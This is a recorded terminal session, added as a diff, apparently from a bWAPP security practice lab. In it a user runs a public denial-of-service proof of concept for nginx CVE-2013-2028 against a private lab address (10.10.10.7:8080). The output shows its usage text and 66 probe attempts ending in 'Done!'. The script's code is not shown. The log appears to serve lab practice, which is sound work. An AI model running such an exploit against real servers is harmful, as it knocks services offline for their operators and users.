@@ -1,0 +1,85 @@
+Script started on 2020-08-18 02:03:32+05:30 [TERM="xterm-256color" TTY="/dev/pts/6" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Large_Chunk_Size[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Large_Chunk_Size[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Large_Chunk_Size[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Large_Chunk_Size[00m] $ python /home/dinesh/Documents/work/tmp/nginx_dos.py 
+[H[2J[3J======================================================================
+nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2028) [http://www.mertsarica.com]
+======================================================================
+Usage: python nginx_dos.py [target ip:port]
+
+Example: python nginx_dos.py 127.0.0.1:8080
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Large_Chunk_Size[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Large_Chunk_Size[00m] $ python /home/dinesh/Documents/work/tmp/nginx_dos.py 10.10..10.7[1P10.7[C[C[C[C[C:8080
+[H[2J[3J======================================================================
+nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2028) [http://www.mertsarica.com]
+======================================================================
+[*] Knock knock, is anybody there ? (0/66)
+[*] Knock knock, is anybody there ? (1/66)
+[*] Knock knock, is anybody there ? (2/66)
+[*] Knock knock, is anybody there ? (3/66)
+[*] Knock knock, is anybody there ? (4/66)
+[*] Knock knock, is anybody there ? (5/66)
+[*] Knock knock, is anybody there ? (6/66)
+[*] Knock knock, is anybody there ? (7/66)
+[*] Knock knock, is anybody there ? (8/66)
+[*] Knock knock, is anybody there ? (9/66)
+[*] Knock knock, is anybody there ? (10/66)
+[*] Knock knock, is anybody there ? (11/66)
+[*] Knock knock, is anybody there ? (12/66)
+[*] Knock knock, is anybody there ? (13/66)
+[*] Knock knock, is anybody there ? (14/66)
+[*] Knock knock, is anybody there ? (15/66)
+[*] Knock knock, is anybody there ? (16/66)
+[*] Knock knock, is anybody there ? (17/66)
+[*] Knock knock, is anybody there ? (18/66)
+[*] Knock knock, is anybody there ? (19/66)
+[*] Knock knock, is anybody there ? (20/66)
+[*] Knock knock, is anybody there ? (21/66)
+[*] Knock knock, is anybody there ? (22/66)
+[*] Knock knock, is anybody there ? (23/66)
+[*] Knock knock, is anybody there ? (24/66)
+[*] Knock knock, is anybody there ? (25/66)
+[*] Knock knock, is anybody there ? (26/66)
+[*] Knock knock, is anybody there ? (27/66)
+[*] Knock knock, is anybody there ? (28/66)
+[*] Knock knock, is anybody there ? (29/66)
+[*] Knock knock, is anybody there ? (30/66)
+[*] Knock knock, is anybody there ? (31/66)
+[*] Knock knock, is anybody there ? (32/66)
+[*] Knock knock, is anybody there ? (33/66)
+[*] Knock knock, is anybody there ? (34/66)
+[*] Knock knock, is anybody there ? (35/66)
+[*] Knock knock, is anybody there ? (36/66)
+[*] Knock knock, is anybody there ? (37/66)
+[*] Knock knock, is anybody there ? (38/66)
+[*] Knock knock, is anybody there ? (39/66)
+[*] Knock knock, is anybody there ? (40/66)
+[*] Knock knock, is anybody there ? (41/66)
+[*] Knock knock, is anybody there ? (42/66)
+[*] Knock knock, is anybody there ? (43/66)
+[*] Knock knock, is anybody there ? (44/66)
+[*] Knock knock, is anybody there ? (45/66)
+[*] Knock knock, is anybody there ? (46/66)
+[*] Knock knock, is anybody there ? (47/66)
+[*] Knock knock, is anybody there ? (48/66)
+[*] Knock knock, is anybody there ? (49/66)
+[*] Knock knock, is anybody there ? (50/66)
+[*] Knock knock, is anybody there ? (51/66)
+[*] Knock knock, is anybody there ? (52/66)
+[*] Knock knock, is anybody there ? (53/66)
+[*] Knock knock, is anybody there ? (54/66)
+[*] Knock knock, is anybody there ? (55/66)
+[*] Knock knock, is anybody there ? (56/66)
+[*] Knock knock, is anybody there ? (57/66)
+[*] Knock knock, is anybody there ? (58/66)
+[*] Knock knock, is anybody there ? (59/66)
+[*] Knock knock, is anybody there ? (60/66)
+[*] Knock knock, is anybody there ? (61/66)
+[*] Knock knock, is anybody there ? (62/66)
+[*] Knock knock, is anybody there ? (63/66)
+[*] Knock knock, is anybody there ? (64/66)
+[*] Knock knock, is anybody there ? (65/66)
+[*] Knock knock, is anybody there ? (66/66)
+[+] Done!
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Large_Chunk_Size[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Large_Chunk_Size[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Large_Chunk_Size[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Large_Chunk_Size[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-Large_Chunk_Size[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-Large_Chunk_Size[00m] $ exit
+
+Script done on 2020-08-18 02:06:04+05:30 [COMMAND_EXIT_CODE="130"]
